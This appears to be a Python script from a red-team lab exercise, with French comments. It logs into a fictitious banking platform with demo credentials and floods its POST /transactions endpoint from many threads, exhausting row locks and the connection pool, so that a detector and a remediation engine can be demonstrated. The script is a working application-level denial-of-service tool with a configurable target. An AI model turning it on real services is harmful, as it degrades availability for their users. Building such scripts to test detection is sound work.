#!/usr/bin/env python3
"""Scénario Red Team #1 — DoS applicatif contrôlé (épuisement de ressources).

Python standard uniquement. À LANCER DEPUIS LE PC ATTAQUANT, contre le SI fictif (sujet §9).

Vecteur : marteler POST /transactions sur le MÊME compte (from == to, montant 1, net nul).
Chaque transaction prend un verrou de ligne (FOR UPDATE) et une connexion du pool ; sous
forte concurrence, les transactions se sérialisent et le pool (taille bornée) sature ->
latence qui explose + erreurs 5xx (timeouts du pool). C'est une vraie dégradation observable,
que le détecteur ML repère et que le moteur de remédiation corrige (délestage).

Usage :
    python3 dos_flood.py --target http://localhost:8080 --concurrency 50 --duration 60
    # démo réseau : --target http://192.168.137.1:8080
"""
import argparse, json, threading, time, urllib.request, urllib.error
from urllib.parse import urlsplit

DEMO_USER, DEMO_PASS = "demo", "demo1234"


def login(target):
    u = urlsplit(target)
    url = f"{u.scheme}://{u.hostname}:3001/api/auth/login"
    data = json.dumps({"username": DEMO_USER, "password": DEMO_PASS}).encode()
    req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=8) as r:
            return json.loads(r.read())["access_token"]
    except Exception as e:
        raise SystemExit(f"Login impossible via {url} : {e}\nVérifiez que la plateforme tourne.")


def accounts(target, token):
    req = urllib.request.Request(f"{target}/accounts", headers={"Authorization": f"Bearer {token}"})
    with urllib.request.urlopen(req, timeout=8) as r:
        return json.loads(r.read())


def worker(target, token, acc, stop_at, stats, lock):
    body = json.dumps({"from_account": acc, "to_account": acc, "amount": 1}).encode()
    while time.perf_counter() < stop_at:
        t0 = time.perf_counter()
        req = urllib.request.Request(f"{target}/transactions", data=body,
                                     headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"})
        try:
            with urllib.request.urlopen(req, timeout=10) as r:
                r.read()
            with lock:
                stats["total"] += 1; stats["lat"].append(time.perf_counter() - t0)
        except urllib.error.HTTPError as e:
            with lock:
                stats["total"] += 1
                if e.code >= 500:
                    stats["err"] += 1
                else:
                    stats["lat"].append(time.perf_counter() - t0)
        except Exception:
            with lock:
                stats["total"] += 1; stats["err"] += 1


def setup(target, attempts=6):
    """Prépare l'attaque de façon robuste : le service peut être lent/en reprise."""
    import time as _t
    last = None
    for i in range(attempts):
        try:
            token = login(target)
            return token, accounts(target, token)[0]["id"]
        except SystemExit:
            raise
        except Exception as e:
            last = e
            print(f"    … service pas encore prêt ({e}); nouvelle tentative {i + 1}/{attempts}…")
            _t.sleep(2)
    raise SystemExit(f"Préparation impossible après {attempts} tentatives : {last}")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://localhost:8080")
    ap.add_argument("--concurrency", type=int, default=50)
    ap.add_argument("--duration", type=int, default=60)
    args = ap.parse_args()

    print(f"[*] Authentification (via {urlsplit(args.target).hostname}:3001)…")
    token, acc = setup(args.target)
    print(f"[*] DoS contrôlé : {args.concurrency} threads pendant {args.duration}s "
          f"(POST /transactions, contention sur le compte {acc}).")
    print("    → latence et erreurs doivent grimper, puis le système se rétablit SEUL.")

    stats = {"total": 0, "err": 0, "lat": []}
    lock = threading.Lock()
    stop_at = time.perf_counter() + args.duration
    threads = [threading.Thread(target=worker, args=(args.target, token, acc, stop_at, stats, lock))
               for _ in range(args.concurrency)]
    for t in threads: t.start()
    for t in threads: t.join()

    lat = sorted(stats["lat"])
    p95 = lat[int(len(lat) * 0.95)] if lat else 0
    avg = sum(lat) / len(lat) if lat else 0
    print(f"\n[résultat attaquant] requêtes={stats['total']} erreurs(5xx)={stats['err']} "
          f"({100 * stats['err'] / max(stats['total'],1):.1f}%) | "
          f"latence moy={avg*1000:.0f}ms p95={p95*1000:.0f}ms")
    print("[*] Attaque terminée. La reprise doit apparaître dans l'historique de remédiation.")


if __name__ == "__main__":
    main()
